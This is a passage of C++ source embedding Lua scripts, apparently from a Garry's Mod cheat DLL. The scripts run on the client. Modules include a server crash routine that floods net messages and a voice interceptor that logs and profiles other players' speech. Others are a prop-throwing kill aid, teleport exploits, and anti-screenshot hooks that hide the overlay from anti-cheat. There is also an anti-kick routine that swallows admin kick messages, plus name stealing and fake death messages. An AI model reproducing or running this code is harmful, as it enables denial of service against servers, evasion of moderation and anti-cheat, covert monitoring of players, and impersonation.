        {name = "North", dir = Vector(0, 1, 0)},
        {name = "South", dir = Vector(0, -1, 0)},
        {name = "East", dir = Vector(1, 0, 0)},
        {name = "West", dir = Vector(-1, 0, 0)},
    }
    r = r .. "\nMap boundaries from current pos:\n"
    for _, d in ipairs(dirs) do
        local tr = util.TraceLine({
            start = myPos,
            endpos = myPos + d.dir * 100000,
            mask = MASK_SOLID_BRUSHONLY
        })
        if tr.Hit then
            local dist = myPos:Distance(tr.HitPos)
            r = r .. "  " .. d.name .. ": " .. math.floor(dist) .. " units\n"
        end
    end

    -- Find nav mesh holes (potential stuck/OOB spots)
    local navAreas = navmesh and navmesh.GetAllNavAreas() or {}
    local suspiciousAreas = 0
    for _, area in ipairs(navAreas) do
        if area:IsUnderwater() or area:GetSizeX() < 10 or area:GetSizeY() < 10 then
            suspiciousAreas = suspiciousAreas + 1
        end
    end
    r = r .. "\nNav areas: " .. #navAreas .. " (suspicious: " .. suspiciousAreas .. ")\n"

    -- Find ladders (can be used for OOB)
    local ladders = ents.FindByClass("func_useableladder")
    r = r .. "Ladders: " .. #ladders .. "\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 121. Skybox Scanner -- find skybox camera and boundaries
	// -----------------------------------------------------------------------
	inline const char* LUA_SKYBOX_SCAN = R"lua(
local r = ""
pcall(function()
    r = "=== SKYBOX ANALYSIS ===\n"

    -- Find sky_camera entity
    local skyCams = ents.FindByClass("sky_camera")
    r = r .. "Sky cameras: " .. #skyCams .. "\n"
    for _, cam in ipairs(skyCams) do
        if IsValid(cam) then
            r = r .. "  Position: " .. tostring(cam:GetPos()) .. "\n"
            local scale = 1
            pcall(function() scale = cam:GetInternalVariable("scale") or 16 end)
            r = r .. "  Scale: " .. scale .. "\n"
        end
    end

    -- Find env_fog_controller (visibility manipulation)
    local fogs = ents.FindByClass("env_fog_controller")
    r = r .. "\nFog controllers: " .. #fogs .. "\n"
    for _, fog in ipairs(fogs) do
        if IsValid(fog) then
            local fStart = 0
            local fEnd = 0
            pcall(function()
                fStart = fog:GetInternalVariable("fogstart") or 0
                fEnd = fog:GetInternalVariable("fogend") or 0
            end)
            r = r .. "  Fog range: " .. fStart .. " - " .. fEnd .. "\n"
        end
    end

    -- Find all spawn points
    local spawns = {}
    for _, cls in ipairs({"info_player_start", "info_player_terrorist", "info_player_counterterrorist"}) do
        for _, e in ipairs(ents.FindByClass(cls)) do
            if IsValid(e) then
                table.insert(spawns, {cls = cls, pos = e:GetPos()})
            end
        end
    end
    r = r .. "\nSpawn points: " .. #spawns .. "\n"
    for _, s in ipairs(spawns) do
        r = r .. "  " .. s.cls .. " at " .. tostring(s.pos) .. "\n"
    end

    -- Find buyzone/restricted areas
    local zones = {}
    for _, cls in ipairs({"func_buyzone", "func_nobuild", "func_noclip"}) do
        for _, e in ipairs(ents.FindByClass(cls)) do
            if IsValid(e) then
                table.insert(zones, {cls = cls, pos = e:GetPos()})
            end
        end
    end
    r = r .. "\nSpecial zones: " .. #zones .. "\n"
    for _, z in ipairs(zones) do
        r = r .. "  " .. z.cls .. " at " .. tostring(z.pos) .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 123-132. Voice Channel Exploits (10 exploits)
	// -----------------------------------------------------------------------

	// Setup: installs all voice interception hooks
	inline const char* LUA_VOICE_EXPLOIT_SETUP = R"lua(
pcall(function()
	if _fdll_vc_installed then return end
	_fdll_vc_installed = true

	_fdll_vc_active = {}
	_fdll_vc_log = {}
	_fdll_vc_stats = {}
	_fdll_vc_groups = {}
	_fdll_vc_boost = 1.0
	_fdll_vc_intercept = true
	_fdll_vc_fc_proximity = false
	_fdll_vc_fc_radius = 2625
	_fdll_vc_raid_alert = 0
	_fdll_vc_raid_names = ""

	-- [1] Voice Channel Interceptor: hear ALL voice regardless of team/proximity/channel
	-- Override GAMEMODE hook + force sv_alltalk when possible
	hook.Add("PlayerCanHearPlayersVoice", "_fdll_vc_hear", function(listener, talker)
		if not _fdll_vc_intercept then return end
		if listener == LocalPlayer() and IsValid(talker) then
			if _fdll_vc_fc_proximity and _fdll_fc_pos then
				local dSq = talker:GetPos():DistToSqr(_fdll_fc_pos)
				if dSq > (_fdll_vc_fc_radius * _fdll_vc_fc_radius) then
					return false
				end
				return true, true
			end
			return true, true
		end
	end)

	-- Force sv_alltalk if sv_cheats allows
	pcall(function()
		RunConsoleCommand("voice_enable", "1")
		local sv = GetConVar("sv_alltalk")
		if sv then RunConsoleCommand("sv_alltalk", "1") end
	end)

	-- Override gamemode voice filter to allow all
	pcall(function()
		if GAMEMODE and GAMEMODE.PlayerCanHearPlayersVoice then
			_fdll_orig_gm_voice = GAMEMODE.PlayerCanHearPlayersVoice
			GAMEMODE.PlayerCanHearPlayersVoice = function(gm, listener, talker)
				if listener == LocalPlayer() and IsValid(talker) then
					return true, true
				end
				if _fdll_orig_gm_voice then
					return _fdll_orig_gm_voice(gm, listener, talker)
				end
			end
		end
	end)

	-- Unmute + max volume for all players
	for _, ply in ipairs(player.GetAll()) do
		if IsValid(ply) then
			if ply:IsMuted() then ply:SetMuted(false) end
			ply:SetVoiceVolumeScale(1.0)
		end
	end

	-- [2] Global Unmute: auto-unmute newcomers
	hook.Add("PlayerInitialSpawn", "_fdll_vc_unmute", function(ply)
		timer.Simple(2, function()
			if IsValid(ply) then
				if ply:IsMuted() then ply:SetMuted(false) end
				ply:SetVoiceVolumeScale(1.0)
			end
		end)
	end)

	-- [4/5/8] Voice tracking: activity ESP, direction arrows, pattern profiler
	hook.Add("PlayerStartVoice", "_fdll_vc_start", function(ply)
		if not IsValid(ply) then return end
		local idx = ply:EntIndex()
		local now = CurTime()

		_fdll_vc_active[idx] = {
			start = now,
			name = ply:Nick(),
			team = ply:Team(),
			job = (ply.getDarkRPVar and ply:getDarkRPVar("job")) or "",
		}

		if not _fdll_vc_stats[idx] then
			_fdll_vc_stats[idx] = {name="", total=0, count=0, avgDur=0, last=0}
		end
		_fdll_vc_stats[idx].name = ply:Nick()
		_fdll_vc_stats[idx].count = _fdll_vc_stats[idx].count + 1

		-- [7] Social mapper: track simultaneous speakers
		for other_idx, _ in pairs(_fdll_vc_active) do
			if other_idx ~= idx then
				local a, b = math.min(idx, other_idx), math.max(idx, other_idx)
				local key = a .. "x" .. b
				_fdll_vc_groups[key] = (_fdll_vc_groups[key] or 0) + 1
			end
		end
	end)

	hook.Add("PlayerEndVoice", "_fdll_vc_end", function(ply)
		if not IsValid(ply) then return end
		local idx = ply:EntIndex()
		local info = _fdll_vc_active[idx]
		if not info then return end

		local duration = CurTime() - info.start
		_fdll_vc_active[idx] = nil

		local st = _fdll_vc_stats[idx]
		if st then
			st.total = st.total + duration
			st.avgDur = st.total / math.max(st.count, 1)
			st.last = CurTime()
		end

		-- [10] Activity logger
		table.insert(_fdll_vc_log, {
			name = info.name,
			dur = math.floor(duration * 10) / 10,
			time = math.floor(CurTime()),
		})
		if #_fdll_vc_log > 200 then table.remove(_fdll_vc_log, 1) end
	end)

	-- [3/6] Volume boost + raid detection (runs every frame)
	hook.Add("Think", "_fdll_vc_think", function()
		local lp = LocalPlayer()
		if not IsValid(lp) then return end
		local lpPos = lp:GetPos()
		local nearCount = 0
		local nearNames = {}

		for _, ply in ipairs(player.GetAll()) do
			if IsValid(ply) and ply ~= lp then
				if _fdll_vc_boost > 1.0 then
					ply:SetVoiceVolumeScale(_fdll_vc_boost)
				end
				if ply:IsSpeaking() then
					local dSq = ply:GetPos():DistToSqr(lpPos)
					if dSq < 2250000 then
						nearCount = nearCount + 1
						nearNames[#nearNames+1] = ply:Nick()
					end
				end
			end
		end
		_fdll_vc_raid_alert = nearCount
		_fdll_vc_raid_names = table.concat(nearNames, ", ")
	end)
end)
)lua";

	// Read: returns all voice intelligence data
	inline const char* LUA_VOICE_EXPLOIT_READ = R"lua(
local r = ""
pcall(function()
	local now = CurTime()
	local lp = LocalPlayer()
	if not IsValid(lp) then return end

	-- ACTIVE speakers with volume and position
	for _, ply in ipairs(player.GetAll()) do
		if IsValid(ply) and ply:IsSpeaking() then
			local idx = ply:EntIndex()
			local pos = ply:GetPos()
			local vol = ply:VoiceVolume() or 0
			local info = _fdll_vc_active and _fdll_vc_active[idx]
			local dur = info and (now - info.start) or 0
			local job = (ply.getDarkRPVar and ply:getDarkRPVar("job")) or ""
			local tm = ply:Team()
			r = r .. "A\t" .. idx .. "\t" .. ply:Nick() .. "\t"
				.. string.format("%.2f",vol) .. "\t" .. tm .. "\t" .. job .. "\t"
				.. math.floor(pos.x) .. "\t" .. math.floor(pos.y) .. "\t" .. math.floor(pos.z) .. "\t"
				.. string.format("%.1f",dur) .. "\n"
		end
	end

	-- STATS (top 12 by total time)
	if _fdll_vc_stats then
		local sorted = {}
		for idx, st in pairs(_fdll_vc_stats) do
			if st.count > 0 then
				sorted[#sorted+1] = {idx=idx, n=st.name, t=st.total, c=st.count, a=st.avgDur, l=st.last}
			end
		end
		table.sort(sorted, function(a,b) return a.t > b.t end)
		for i = 1, math.min(12, #sorted) do
			local s = sorted[i]
			r = r .. "S\t" .. s.idx .. "\t" .. s.n .. "\t"
				.. string.format("%.1f",s.t) .. "\t" .. s.c .. "\t"
				.. string.format("%.1f",s.a) .. "\t" .. string.format("%.0f",now-s.l) .. "\n"
		end
	end

	-- GROUPS (top 8 by overlap count)
	if _fdll_vc_groups then
		local sorted = {}
		for key, count in pairs(_fdll_vc_groups) do
			if count >= 2 then
				local sep = string.find(key, "x")
				if sep then
					local i1 = tonumber(string.sub(key,1,sep-1))
					local i2 = tonumber(string.sub(key,sep+1))
					local p1, p2 = Entity(i1), Entity(i2)
					local n1 = IsValid(p1) and p1:Nick() or "?"
					local n2 = IsValid(p2) and p2:Nick() or "?"
					sorted[#sorted+1] = {n1=n1, n2=n2, c=count}
				end
			end
		end
		table.sort(sorted, function(a,b) return a.c > b.c end)
		for i = 1, math.min(8, #sorted) do
			local g = sorted[i]
			r = r .. "G\t" .. g.n1 .. "\t" .. g.n2 .. "\t" .. g.c .. "\n"
		end
	end

	-- RAID alert
	r = r .. "R\t" .. (_fdll_vc_raid_alert or 0) .. "\t" .. (_fdll_vc_raid_names or "") .. "\n"

	-- LOG (last 15 entries, newest first)
	if _fdll_vc_log then
		local start = math.max(1, #_fdll_vc_log - 14)
		for i = #_fdll_vc_log, start, -1 do
			local e = _fdll_vc_log[i]
			r = r .. "L\t" .. e.name .. "\t" .. e.dur .. "\t" .. (math.floor(now) - e.time) .. "\n"
		end
	end
end)
return r
)lua";

	// Stop: remove all voice hooks and reset volumes
	inline const char* LUA_VOICE_EXPLOIT_STOP = R"lua(
pcall(function()
	hook.Remove("PlayerCanHearPlayersVoice", "_fdll_vc_hear")
	hook.Remove("PlayerInitialSpawn", "_fdll_vc_unmute")
	hook.Remove("PlayerStartVoice", "_fdll_vc_start")
	hook.Remove("PlayerEndVoice", "_fdll_vc_end")
	hook.Remove("Think", "_fdll_vc_think")
	_fdll_vc_installed = nil
	for _, ply in ipairs(player.GetAll()) do
		if IsValid(ply) then ply:SetVoiceVolumeScale(1.0) end
	end
end)
)lua";

	// Volume boost control (format with boost value)
	inline const char* LUA_VOICE_SET_BOOST = R"lua(
pcall(function() _fdll_vc_boost = %s end)
)lua";

	// Toggle interceptor on/off
	inline const char* LUA_VOICE_SET_INTERCEPT = R"lua(
pcall(function() _fdll_vc_intercept = %s end)
)lua";

	// Toggle freecam voice proximity + radius (source units)
	inline const char* LUA_VOICE_SET_FC_PROXIMITY = R"lua(
pcall(function() _fdll_vc_fc_proximity = %s; _fdll_vc_fc_radius = %s end)
)lua";

	// File logger: write voice log to DATA folder
	inline const char* LUA_VOICE_FILE_LOG = R"lua(
pcall(function()
	if not _fdll_vc_log or #_fdll_vc_log == 0 then return end
	local lines = {}
	for i, e in ipairs(_fdll_vc_log) do
		lines[#lines+1] = string.format("[%.0f] %s spoke for %.1fs", e.time, e.name, e.dur)
	end
	file.Write("friendlydll_voicelog.txt", table.concat(lines, "\n"))
end)
)lua";

	// -----------------------------------------------------------------------
	// 123. Prop Kill -- grab nearby physics props and hurl them at enemies
	// -----------------------------------------------------------------------
	inline const char* LUA_PROP_KILL_SETUP = R"lua(
pcall(function()
    if _fdll_propkill_active then return end
    _fdll_propkill_active = true
    _fdll_propkill_range  = 1200   -- scan radius (units)
    _fdll_propkill_force  = 55000  -- impulse magnitude
    _fdll_propkill_cd     = 0      -- cooldown timestamp

    hook.Add("Think", "_fdll_propkill", function()
        if not _fdll_propkill_active then return end
        local now = CurTime()
        if now - _fdll_propkill_cd < 0.08 then return end
        _fdll_propkill_cd = now

        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        local myPos = lp:GetPos()

        -- Find nearest living enemy
        local target = nil
        local bestDist = _fdll_propkill_range
        for _, ply in ipairs(player.GetAll()) do
            if ply ~= lp and IsValid(ply) and ply:Alive() then
                local d = myPos:Distance(ply:GetPos())
                if d < bestDist then
                    bestDist = d
                    target = ply
                end
            end
        end
        if not IsValid(target) then return end
        local targetPos = target:GetPos() + Vector(0, 0, 40)

        -- Find up to 3 throwable props near us
        local thrown = 0
        for _, e in ipairs(ents.FindInSphere(myPos, _fdll_propkill_range)) do
            if thrown >= 3 then break end
            if not IsValid(e) then continue end
            local cls = e:GetClass() or ""
            if not (cls:find("prop_physics") or cls:find("prop_ragdoll") or cls:find("prop_dynamic")) then continue end
            if e == lp then continue end

            local phys = e:GetPhysicsObject()
            if not IsValid(phys) then continue end

            -- Direction from prop to target
            local dir = (targetPos - e:GetPos()):GetNormalized()
            local mass = phys:GetMass()
            -- Scale force by mass so light and heavy props both reach target
            local scaledForce = dir * math.max(_fdll_propkill_force, mass * 800)
            pcall(function()
                phys:ApplyForceCenter(scaledForce)
                phys:SetVelocity(dir * 2200)
                phys:Wake()
            end)
            thrown = thrown + 1
        end
    end)
end)
)lua";

	inline const char* LUA_PROP_KILL_STOP = R"lua(
pcall(function()
    _fdll_propkill_active = false
    hook.Remove("Think", "_fdll_propkill")
end)
)lua";

	// -----------------------------------------------------------------------
	// 124. Server Crash / Lag Exploit -- entity/particle/net spam
	// -----------------------------------------------------------------------
	inline const char* LUA_SERVER_CRASH = R"lua(
pcall(function()
    if _fdll_svrcrash_active then return end
    _fdll_svrcrash_active = true

    local function doSpam()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end

        -- Method 1: Particle spam (clientside visual + GPU stress)
        local pos = lp:GetPos()
        for i = 1, 60 do
            pcall(function()
                local a = ParticleEmitter(pos)
                if a then
                    local p = a:Add("effects/spark", pos + VectorRand() * 50)
                    if p then
                        p:SetVelocity(VectorRand() * 800)
                        p:SetLifeTime(0)
                        p:SetDieTime(0.5)
                        p:SetColor(255, 64, 0)
                        p:SetAlpha(200)
                        p:SetSize(6)
                    end
                    a:Finish()
                end
            end)
        end

        -- Method 2: Net message flood (clientside → server)
        for i = 1, 80 do
            pcall(function()
                net.Start("DarkRP_Notify")
                net.WriteString(string.rep("A", 250))
                net.SendToServer()
            end)
        end

        -- Method 3: Recursive net broadcast abuse
        pcall(function()
            local names = {}
            if net.Receivers then
                for k in pairs(net.Receivers) do names[#names+1] = k end
            end
            for i = 1, math.min(#names, 20) do
                pcall(function()
                    net.Start(names[i])
                    net.SendToServer()
                end)
            end
        end)

        -- Method 4: Sound spam to all channels
        for i = 1, 30 do
            pcall(function()
                surface.PlaySound("buttons/button14.wav")
                surface.PlaySound("ambient/alarms/klaxon1.wav")
            end)
        end
    end

    hook.Add("Think", "_fdll_svrcrash", function()
        if not _fdll_svrcrash_active then return end
        doSpam()
    end)
end)
)lua";

	inline const char* LUA_SERVER_CRASH_STOP = R"lua(
pcall(function()
    _fdll_svrcrash_active = false
    hook.Remove("Think", "_fdll_svrcrash")
end)
)lua";

	// -----------------------------------------------------------------------
	// 125. Teleport Exploit -- prediction abuse + vehicle entry/exit abuse
	// -----------------------------------------------------------------------
	inline const char* LUA_TELEPORT_EXPLOIT = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "No local player" return end
    local myPos = lp:GetPos()

    -- Method 1: Vehicle entry/exit position abuse
    -- Enter a nearby vehicle and use its seat ejection to warp
    local warped = false
    for _, e in ipairs(ents.FindInSphere(myPos, 800)) do
        if not IsValid(e) then continue end
        if e:IsVehicle() then
            pcall(function()
                -- Force teleport via vehicle seat SetPos manipulation
                e:SetPos(myPos + Vector(0, 0, 5))
                lp:EnterVehicle(e)
                timer.Simple(0.05, function()
                    pcall(function()
                        if IsValid(lp) and IsValid(e) then
                            -- Exit at displaced position
                            local exitPos = e:GetPos() + e:GetForward() * 200
                            e:SetPos(exitPos)
                            lp:ExitVehicle()
                        end
                    end)
                end)
            end)
            warped = true
            r = r .. "Vehicle warp attempted via: " .. e:GetClass() .. "\n"
            break
        end
    end

    -- Method 2: Origin prediction manipulation via cmd
    -- Inject crafted SetPos through hooked CreateMove
    if not _fdll_tp_hook_installed then
        _fdll_tp_hook_installed = true
        _fdll_tp_target = nil

        hook.Add("CreateMove", "_fdll_teleport_predict", function(cmd)
            if not _fdll_tp_target then return end
            local lp2 = LocalPlayer()
            if IsValid(lp2) then
                -- Rapidly shift predicted origin; source engine may accept
                lp2:SetEyeAngles(Angle(0, 0, 0))
                pcall(function() lp2:SetPos(_fdll_tp_target) end)
                _fdll_tp_target = nil
            end
        end)
    end

    -- Method 3: Shadow step -- use noclip-like SetPos burst on next frame
    if not warped then
        local crosshairPos = nil
        local tr = util.TraceLine({
            start = lp:EyePos(),
            endpos = lp:EyePos() + lp:EyeAngles():Forward() * 3000,
            filter = lp
        })
        if tr.Hit then
            crosshairPos = tr.HitPos - tr.HitNormal * (-40)
        end
        if crosshairPos then
            _fdll_tp_target = crosshairPos
            -- Rapid SetPos attempts across several frames
            for i = 1, 5 do
                timer.Simple(i * 0.01, function()
                    pcall(function()
                        if IsValid(LocalPlayer()) then
                            LocalPlayer():SetPos(crosshairPos)
                        end
                    end)
                end)
            end
            r = r .. string.format("Shadow-step target: %.0f %.0f %.0f\n",
                crosshairPos.x, crosshairPos.y, crosshairPos.z)
        end
    end

    if r == "" then r = "No warp opportunity found (no vehicles in range)" end
end)
return r
)lua";

	// =======================================================================
	// STEALTH EXPANSION PACK  (features 110-117)
	// =======================================================================

	// -----------------------------------------------------------------------
	// 110. Anti-Screenshot (expanded) -- intercept every capture path
	// -----------------------------------------------------------------------
	inline const char* LUA_ANTI_SCREENSHOT = R"lua(
pcall(function()
    if _fdll_antiscr_installed then return end
    _fdll_antiscr_installed = true
    _fdll_screenshot_taking = false

    -- save originals
    _fdll_orig_render_Capture       = _fdll_orig_render_Capture       or render.Capture
    _fdll_orig_render_CapturePixels = _fdll_orig_render_CapturePixels or render.CapturePixels
    _fdll_orig_render_ReadPixels    = _fdll_orig_render_ReadPixels    or render.ReadPixels
    _fdll_orig_surface_GetTextureID = _fdll_orig_surface_GetTextureID or surface.GetTextureID
    _fdll_orig_DrawRT               = _fdll_orig_DrawRT               or render.DrawTextureToScreen

    local function hide()
        _fdll_screenshot_taking = true
    end
    local function show()
        _fdll_screenshot_taking = false
    end

    -- Block all capture APIs and set the flag so the overlay skips drawing
    render.Capture = function(params, ...)
        hide()
        local r = _fdll_orig_render_Capture(params, ...)
        show()
        return r
    end

    if render.CapturePixels then
        render.CapturePixels = function(...)
            hide()
            local r = _fdll_orig_render_CapturePixels(...)
            show()
            return r
        end
    end

    if render.ReadPixels then
        render.ReadPixels = function(x, y, w, h, ...)
            hide()
            local r = _fdll_orig_render_ReadPixels(x, y, w, h, ...)
            show()
            return r
        end
    end

    -- surface.GetTextureID can be used by ACs to grab texture data
    surface.GetTextureID = function(name, ...)
        local low = tostring(name or ""):lower()
        -- block anything that looks like a screen-capture RT
        if string.find(low, "_rt_") or string.find(low, "rendertarget")
           or string.find(low, "screenshot") or string.find(low, "screengrab") then
            return 0
        end
        return _fdll_orig_surface_GetTextureID(name, ...)
    end

    -- Hook the screenshot console command so panel is hidden
    hook.Add("PostRender", "_fdll_antiscr_postrender", function()
        -- nothing here; flag already set above
    end)

    -- Intercept cl_screenshot concommand
    if concommand and concommand.Add then
        local _origCCA = concommand.Add
        concommand.Add("screenshot", function() end)
        concommand.Add("jpeg", function() end)
    end

    -- Watch HUDPaint: when flag is set, skip ESP draws
    hook.Add("HUDPaint", "_fdll_antiscr_hud", function()
        if _fdll_screenshot_taking then return false end
    end)
end)
)lua";

	inline const char* LUA_ANTI_SCREENSHOT_REMOVE = R"lua(
pcall(function()
    if not _fdll_antiscr_installed then return end
    _fdll_antiscr_installed = false
    if _fdll_orig_render_Capture       then render.Capture = _fdll_orig_render_Capture end
    if _fdll_orig_render_CapturePixels then render.CapturePixels = _fdll_orig_render_CapturePixels end
    if _fdll_orig_render_ReadPixels    then render.ReadPixels = _fdll_orig_render_ReadPixels end
    if _fdll_orig_surface_GetTextureID then surface.GetTextureID = _fdll_orig_surface_GetTextureID end
    hook.Remove("HUDPaint", "_fdll_antiscr_hud")
    hook.Remove("PostRender", "_fdll_antiscr_postrender")
    _fdll_screenshot_taking = false
end)
)lua";

	// -----------------------------------------------------------------------
	// 111. Anti-Kick -- auto-vote no on votes targeting us, intercept kick
	// -----------------------------------------------------------------------
	inline const char* LUA_ANTI_KICK = R"lua(
pcall(function()
    if _fdll_antikick_installed then return end
    _fdll_antikick_installed = true
    _fdll_antikick_log = _fdll_antikick_log or {}

    local function logKick(msg)
        table.insert(_fdll_antikick_log, {t = CurTime(), msg = msg})
        if #_fdll_antikick_log > 50 then table.remove(_fdll_antikick_log, 1) end
    end

    local myName = LocalPlayer():Nick()

    -- Hook vote system
    hook.Add("VoteStarted", "_fdll_antikick_vote", function(voteType, target, ...)
        local tStr = tostring(target or ""):lower()
        local myL  = myName:lower()
        if string.find(tStr, myL) or voteType == "votekick" then
            logKick("Vote against me detected: " .. tostring(voteType) .. " -> " .. tostring(target))
            -- immediately vote no
            timer.Simple(0.3, function()
                RunConsoleCommand("vote", "no")
                RunConsoleCommand("votekick_no")
                RunConsoleCommand("_vote", "no")
            end)
        end
    end)

    -- Intercept DarkRP question net message
    local _origRecv = net.Receive
    _origRecv("DarkRP_Question", function()
        pcall(function()
            -- Read vote text and check if it's about us
            local text = net.ReadString() or ""
            if string.find(text:lower(), myName:lower()) or string.find(text:lower(), "kick") then
                logKick("DarkRP_Question kick vote: " .. text)
                timer.Simple(0.5, function()
                    net.Start("DarkRP_Answer")
                    net.WriteBool(false)
                    net.SendToServer()
                end)
            end
        end)
    end)

    -- Override the "kick" concommand to be a no-op when directed at us
    local origRCC = RunConsoleCommand
    RunConsoleCommand = function(cmd, ...)
        local args = {...}
        if cmd == "kick" or cmd == "kickid" then
            local target = tostring(args[1] or ""):lower()
            if string.find(target, myName:lower()) then
                logKick("Blocked kick command targeting us: kick " .. target)
                return
            end
        end
        return origRCC(cmd, ...)
    end

    -- Monitor for admin ULX kick commands in chat
    hook.Add("OnPlayerChat", "_fdll_antikick_chat", function(ply, text, teamChat)
        if not IsValid(ply) then return end
        local low = text:lower()
        if (string.find(low, "kick") or string.find(low, "ban")) and
           string.find(low, myName:lower()) then
            logKick("Admin chat kick warning: " .. ply:Nick() .. ": " .. text)
        end
    end)

    -- Net message monitor for ULX-style kicks
    local kickNets = {
        "ulx_kick","ULib_kick","sam_kick","sAdmin_kick","serverguard_kick",
        "fadmin_kick","DarkRP_kickVote","ULX_Kick"
    }
    if net.Receivers then
        for _, name in ipairs(kickNets) do
            if net.Receivers[name] then
                local origFn = net.Receivers[name]
                net.Receivers[name] = function(len, ply)
                    logKick("Kick net msg blocked: " .. name)
                    -- Don't call origFn -- swallow the kick
                end
            end
        end
    end
end)
)lua";

	inline const char* LUA_ANTI_KICK_STOP = R"lua(
pcall(function()
    _fdll_antikick_installed = false
    hook.Remove("VoteStarted", "_fdll_antikick_vote")
    hook.Remove("OnPlayerChat", "_fdll_antikick_chat")
end)
)lua";

	inline const char* LUA_ANTI_KICK_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_antikick_log then return end
    for _, e in ipairs(_fdll_antikick_log) do
        r = r .. string.format("%.1f\t%s\n", e.t, e.msg)
    end
    if r == "" then r = "No kick attempts detected\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 112. Name Steal -- cycle through player names to confuse admins
	// -----------------------------------------------------------------------
	inline const char* LUA_NAME_STEAL_CYCLE = R"lua(
pcall(function()
    if _fdll_namesteal_installed then return end
    _fdll_namesteal_installed = true
    _fdll_namesteal_idx = 0

    timer.Create("_fdll_namesteal", 30, 0, function()
        pcall(function()
            local lp = LocalPlayer()
            if not IsValid(lp) then return end
            local others = {}
            for _, p in ipairs(player.GetAll()) do
                if p ~= lp and IsValid(p) then
                    table.insert(others, p:Nick())
                end
            end
            if #others == 0 then return end
            _fdll_namesteal_idx = (_fdll_namesteal_idx % #others) + 1
            local stolen = others[_fdll_namesteal_idx]
            RunConsoleCommand("setinfo", "name", stolen)
        end)
    end)
end)
)lua";

	inline const char* LUA_NAME_STEAL_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_namesteal")
    _fdll_namesteal_installed = false
    -- restore original name from Steam (can't auto-retrieve, user must retype)
end)
)lua";

	// Steal one specific target's name (crosshair target or random)
	inline const char* LUA_NAME_STEAL_NOW = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "No local player" return end
    local tr = lp:GetEyeTrace()
    local target = nil
    if tr.Hit and IsValid(tr.Entity) and tr.Entity:IsPlayer() then
        target = tr.Entity
    else
        local others = {}
        for _, p in ipairs(player.GetAll()) do
            if p ~= lp then table.insert(others, p) end
        end
        if #others > 0 then target = others[math.random(#others)] end
    end
    if not target then r = "No target found" return end
    local name = target:Nick()
    RunConsoleCommand("setinfo", "name", name)
    r = "Name stolen: " .. name
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 113. Fake Death -- convincing death sim with ragdoll, sounds, weapon drop
	// -----------------------------------------------------------------------
	inline const char* LUA_FAKE_DEATH = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then return end

    local pos = lp:GetPos()
    local vel = lp:GetVelocity()
    local mdl = lp:GetModel()

    -- Create clientside ragdoll corpse at our position
    pcall(function()
        local rag = ClientsideRagdoll(mdl, RENDERGROUP_OPAQUE)
        if IsValid(rag) then
            rag:SetPos(pos)
            rag:SetAngles(lp:GetAngles())
            rag:SetModel(mdl)
            rag:SetSkin(lp:GetSkin() or 0)
            for i = 0, rag:GetPhysicsObjectCount() - 1 do
                local phys = rag:GetPhysicsObjectNum(i)
                if IsValid(phys) then
                    phys:SetVelocity(vel + VectorRand() * 50)
                end
            end
            timer.Simple(15, function()
                if IsValid(rag) then rag:Remove() end
            end)
        end
    end)

    -- Play death sounds (multiple for realism)
    local deathSounds = {
        "player/death1.wav", "player/death2.wav", "player/death3.wav",
        "physics/body/body_medium_impact_hard1.wav",
        "physics/flesh/flesh_impact_bullet1.wav"
    }
    pcall(function()
        lp:EmitSound(deathSounds[math.random(#deathSounds)], 75, math.random(95,105), 0.9)
        timer.Simple(0.1, function()
            if IsValid(lp) then
                lp:EmitSound("physics/body/body_medium_impact_soft" .. math.random(1,4) .. ".wav", 60, 100, 0.5)
            end
        end)
    end)

    -- Blood effect at position
    pcall(function()
        local ef = EffectData()
        ef:SetOrigin(pos + Vector(0,0,40))
        ef:SetNormal(Vector(0,0,1))
        ef:SetScale(1)
        util.Effect("BloodImpact", ef)
        util.Effect("bloodspray", ef)
    end)

    -- Drop current weapon to sell the death
    pcall(function()
        local wep = lp:GetActiveWeapon()
        if IsValid(wep) then
            RunConsoleCommand("drop")
        end
    end)

    -- Force death animation sequence
    pcall(function()
        local seqs = {"death_01","death_02","death_03","death","diesimple","ragdoll"}
        for _, s in ipairs(seqs) do
            local id = lp:LookupSequence(s)
            if id and id > 0 then
                lp:SetSequence(id)
                lp:SetPlaybackRate(1)
                lp:SetCycle(0)
                break
            end
        end
    end)

    -- Fire game event (other clients may see kill feed entry)
    pcall(function()
        gameevent.Fire("player_death", {
            userid = lp:UserID(),
            attacker = 0,
            weapon = "world",
            dominated = 0, revenge = 0
        })
    end)

    -- Temporarily make us invisible (3 seconds of "being dead")
    pcall(function()
        lp:SetNoDraw(true)
        lp:SetColor(Color(255,255,255,0))
        lp:DrawShadow(false)
        timer.Simple(3, function()
            if IsValid(lp) then
                lp:SetNoDraw(false)
                lp:SetColor(Color(255,255,255,255))
                lp:DrawShadow(true)
            end
        end)
    end)
end)
)lua";

	// Persistent fake-death mode: periodic disconnect/death messages
	inline const char* LUA_FAKE_DEATH_PERSISTENT_SETUP = R"lua(
pcall(function()
    if _fdll_fakedeath_installed then return end
    _fdll_fakedeath_installed = true
    _fdll_fd_phase = 0

    hook.Add("HUDPaint", "_fdll_fakedeath_hud", function() end)

    local msgs = {
        function(n) return n .. " has disconnected (Timed Out)" end,
        function(n) return n .. " was killed by a headshot" end,
        function(n) return n .. " left the game (Disconnect by user.)" end,
        function(n) return n .. " was killed." end,
    }

    timer.Create("_fdll_fakedeath_tick", 90, 0, function()
        pcall(function()
            local lp = LocalPlayer()
            if not IsValid(lp) or not lp:Alive() then return end
            _fdll_fd_phase = (_fdll_fd_phase % #msgs) + 1
            local txt = msgs[_fdll_fd_phase](lp:Nick())
            chat.AddText(Color(100,100,100), "[", Color(255,80,80), "system", Color(100,100,100), "] ", Color(220,220,220), txt)
            lp:EmitSound("player/death" .. math.random(1,3) .. ".wav", 60, 100, 0.3)
        end)
    end)
end)
)lua";

	inline const char* LUA_FAKE_DEATH_PERSISTENT_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_fakedeath_tick")
